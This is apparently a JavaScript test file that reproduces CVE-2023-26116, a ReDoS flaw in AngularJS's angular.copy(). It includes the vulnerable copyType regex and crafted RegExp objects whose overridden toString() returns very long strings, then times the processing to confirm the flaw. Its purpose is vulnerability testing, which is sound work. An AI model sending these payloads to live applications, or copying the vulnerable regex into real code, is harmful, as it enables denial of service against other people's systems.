'use strict';

/**
 * Test case for CVE-2023-26116 - ReDoS vulnerability in angular.copy()
 *
 * This test demonstrates the vulnerability in the copyType function when
 * processing RegExp objects with malicious toString() output.
 */

console.log('Testing CVE-2023-26116 ReDoS vulnerability in angular.copy()...\n');
// Minimal dependencies needed for the test
function toString(obj) {
  return Object.prototype.toString.call(obj);
}

// The vulnerable copyType function from AngularJS
function copyType(source) {
  switch (toString.call(source)) {
    case '[object RegExp]':
      // THIS IS THE VULNERABLE LINE - CVE-2023-26116
      var re = new RegExp(source.source, source.toString().match(/[^/]*$/)[0]);
      re.lastIndex = source.lastIndex;
      return re;
  }
  return undefined;
}

// Test function
function testReDoSVulnerability() {
  console.log('Creating malicious RegExp object...');

  // Create a RegExp with a malicious toString method
  var maliciousRegex = new RegExp('test');

  // Override toString to return a string that could trigger ReDoS
  // The vulnerable regex /[^/]*$/ will struggle with this input
  var maliciousToString = '/test/' + 'a'.repeat(10000);
  maliciousRegex.toString = function() {
    return maliciousToString;
  };

  console.log('Testing with malicious input length:', maliciousToString.length);
  console.log('Starting test...');

  var startTime = Date.now();

  try {
    copyType(maliciousRegex);
    var firstEndTime = Date.now();
    var firstDuration = firstEndTime - startTime;

    console.log('Test completed in', firstDuration, 'ms');

    if (firstDuration > 100) {
      console.log('⚠️  WARNING: Potential ReDoS detected - processing took too long');
      console.log('✗ Vulnerability confirmed: CVE-2023-26116 ReDoS in angular.copy()');
      return false;
    } else {
      console.log('✓ Test completed quickly - vulnerability may be fixed or input not malicious enough');
      return true;
    }
  } catch (error) {
    var errorEndTime = Date.now();
    var errorDuration = errorEndTime - startTime;
    console.log('Test failed with error after', errorDuration, 'ms:', error.message);
    return false;
  }
}

// Test with even more malicious input
function testWorseReDoS() {
  console.log('\nTesting with more extreme ReDoS pattern...');

  var maliciousRegex = new RegExp('test');

  // Create an input that will cause catastrophic backtracking
  // Pattern that makes /[^/]*$/ struggle: lots of non-slash chars followed by no ending slash
  var maliciousToString = '/test/' + 'a'.repeat(50000) + 'b';
  maliciousRegex.toString = function() {
    return maliciousToString;
  };

  console.log('Testing with extreme malicious input length:', maliciousToString.length);
  console.log('Starting extreme test...');

  var startTime = Date.now();

  try {
    copyType(maliciousRegex);
    var secondEndTime = Date.now();
    var secondDuration = secondEndTime - startTime;

    console.log('Extreme test completed in', secondDuration, 'ms');

    if (secondDuration > 1000) {
      console.log('🚨 CRITICAL: Severe ReDoS detected - processing took', secondDuration, 'ms');
      console.log('✗ Vulnerability CONFIRMED: CVE-2023-26116 ReDoS in angular.copy()');
      return false;
    } else if (secondDuration > 100) {
      console.log('⚠️  WARNING: Moderate ReDoS detected');
      console.log('✗ Vulnerability likely present: CVE-2023-26116');
      return false;
    } else {
      console.log('✓ Extreme test completed quickly');
      return true;
    }
  } catch (error) {
    var thirdEndTime = Date.now();
    var thirdDuration = thirdEndTime - startTime;
    console.log('Extreme test failed with error after', thirdDuration, 'ms:', error.message);
    return false;
  }
}

// Run tests
var test1Result = testReDoSVulnerability();
var test2Result = testWorseReDoS();

if (!test1Result || !test2Result) {
  console.log('\n🚨 CVE-2023-26116 VULNERABILITY CONFIRMED');
  console.log('The angular.copy() function is vulnerable to ReDoS attacks');
  console.log('Vulnerable code location: copyType function, RegExp case');
  console.log('Vulnerable regex pattern: /[^/]*$/');
} else {
  console.log('\n✓ No ReDoS vulnerability detected in current tests');
}
